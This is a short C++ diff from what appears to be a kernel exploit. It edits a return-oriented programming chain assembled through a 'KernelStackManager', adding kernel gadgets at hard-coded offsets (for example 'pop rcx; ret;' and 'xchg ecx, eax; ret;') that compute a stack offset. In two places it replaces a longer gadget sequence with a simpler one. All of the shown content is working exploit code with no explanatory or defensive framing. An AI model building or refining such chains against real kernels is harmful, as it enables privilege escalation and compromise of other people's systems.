@@ -107,10 +107,12 @@ int main()
     KernelStackManager.AddGadget(0x202547, "pop rax; ret;");
     KernelStackManager.AddValue((std::uint64_t)CurrentStackOffsetAddress, "current stack offset addr");
     KernelStackManager.AddGadget(0x27af45, "mov rax, qword ptr [rax]; ret;");
-    // move rax into rcx so we store the offset in rcx
-    KernelStackManager.AddGadget(0x5453fe, "mov r10, rax; mov rax, r10; add rsp, 0x28; ret;");
-    KernelStackManager.AddPadding(0x28);
-    KernelStackManager.AddGadget(0x302e3e, "mov rcx, rax; cmp rax, r10; jne 0x36d2e8; ret;");
+    // rcx=0
+    KernelStackManager.AddGadget(0x24cd7b, "pop rcx; ret;");
+    KernelStackManager.AddValue(0, "set rcx to 0");
+    // move eax into ecx so we store the offset in rcx (we don't need to use full 64bits because CurrentStackOffsetAddress
+    // holds a small value, either 0x2000 or 0x4000 as an offset
+    KernelStackManager.AddGadget(0x212fcb, "xchg ecx, eax; ret;");
     // restore the old value of rax into rax from rbx
     KernelStackManager.AddGadget(0x56f5f2, "push rbx; pop rax; add rsp, 0x20; pop rbx; ret;");
     KernelStackManager.AddPadding(0x20 + 0x8);
@@ -143,9 +145,9 @@ int main()
     KernelStackManager.AddGadget(0x202547, "pop rax; ret;");
     KernelStackManager.AddValue((std::uint64_t)CurrentStackOffsetAddress, "current stack offset addr");
     KernelStackManager.AddGadget(0x27af45, "mov rax, qword ptr [rax]; ret;");
-    KernelStackManager.AddGadget(0x5453fe, "mov r10, rax; mov rax, r10; add rsp, 0x28; ret;");
-    KernelStackManager.AddPadding(0x28);
-    KernelStackManager.AddGadget(0x302e3e, "mov rcx, rax; cmp rax, r10; jne 0x36d2e8; ret;");
+    KernelStackManager.AddGadget(0x24cd7b, "pop rcx; ret;");
+    KernelStackManager.AddValue(0, "set rcx to 0");
+    KernelStackManager.AddGadget(0x212fcb, "xchg ecx, eax; ret;");
     KernelStackManager.AddGadget(0x56f5f2, "push rbx; pop rax; add rsp, 0x20; pop rbx; ret;");
     KernelStackManager.AddPadding(0x20 + 0x8);
     KernelStackManager.AddGadget(0x263f08, "add rax, rcx; ret;");
